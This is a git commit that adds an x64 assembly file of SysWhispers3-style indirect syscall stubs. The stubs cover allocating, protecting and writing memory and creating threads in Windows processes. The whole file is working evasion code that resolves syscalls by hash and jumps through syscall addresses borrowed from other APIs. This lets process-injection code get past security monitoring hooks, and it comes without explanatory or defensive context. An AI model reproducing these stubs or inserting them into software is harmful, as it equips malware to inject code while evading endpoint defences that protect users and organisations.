bb0568d7f4f49db473e87e13634695b7b461f9ea
Cy83rTR0n <patrarajarshi20@gmail.com>
2024-11-02 09:17:49 -0400

    new changes

---
+++ Syswhispers-asm.x64.asm
@@ -0,0 +1,87 @@
+.code
+
+EXTERN SW3_GetSyscallNumber: PROC
+
+EXTERN SW3_GetRandomSyscallAddress: PROC
+
+Sw3NtAllocateVirtualMemory PROC
+	mov [rsp +8], rcx          ; Save registers.
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 28h
+	mov ecx, 0D554E3DBh        ; Load function hash into ECX.
+	call SW3_GetRandomSyscallAddress        ; Get a syscall offset from a different api.
+	mov r11, rax                           ; Save the address of the syscall
+	mov ecx, 0D554E3DBh        ; Re-Load function hash into ECX (optional).
+	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
+	add rsp, 28h
+	mov rcx, [rsp+8]                      ; Restore registers.
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	jmp r11                                ; Jump to -> Invoke system call.
+Sw3NtAllocateVirtualMemory ENDP
+
+Sw3NtProtectVirtualMemory PROC
+	mov [rsp +8], rcx          ; Save registers.
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 28h
+	mov ecx, 001883333h        ; Load function hash into ECX.
+	call SW3_GetRandomSyscallAddress        ; Get a syscall offset from a different api.
+	mov r11, rax                           ; Save the address of the syscall
+	mov ecx, 001883333h        ; Re-Load function hash into ECX (optional).
+	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
+	add rsp, 28h
+	mov rcx, [rsp+8]                      ; Restore registers.
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	jmp r11                                ; Jump to -> Invoke system call.
+Sw3NtProtectVirtualMemory ENDP
+
+Sw3NtCreateThreadEx PROC
+	mov [rsp +8], rcx          ; Save registers.
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 28h
+	mov ecx, 09CBF4FE5h        ; Load function hash into ECX.
+	call SW3_GetRandomSyscallAddress        ; Get a syscall offset from a different api.
+	mov r11, rax                           ; Save the address of the syscall
+	mov ecx, 09CBF4FE5h        ; Re-Load function hash into ECX (optional).
+	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
+	add rsp, 28h
+	mov rcx, [rsp+8]                      ; Restore registers.
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	jmp r11                                ; Jump to -> Invoke system call.
+Sw3NtCreateThreadEx ENDP
+
+Sw3NtWriteVirtualMemory PROC
+	mov [rsp +8], rcx          ; Save registers.
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 28h
+	mov ecx, 04BD54157h        ; Load function hash into ECX.
+	call SW3_GetRandomSyscallAddress        ; Get a syscall offset from a different api.
+	mov r11, rax                           ; Save the address of the syscall
+	mov ecx, 04BD54157h        ; Re-Load function hash into ECX (optional).
+	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
+	add rsp, 28h
+	mov rcx, [rsp+8]                      ; Restore registers.
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	jmp r11                                ; Jump to -> Invoke system call.
+Sw3NtWriteVirtualMemory ENDP
+
+end
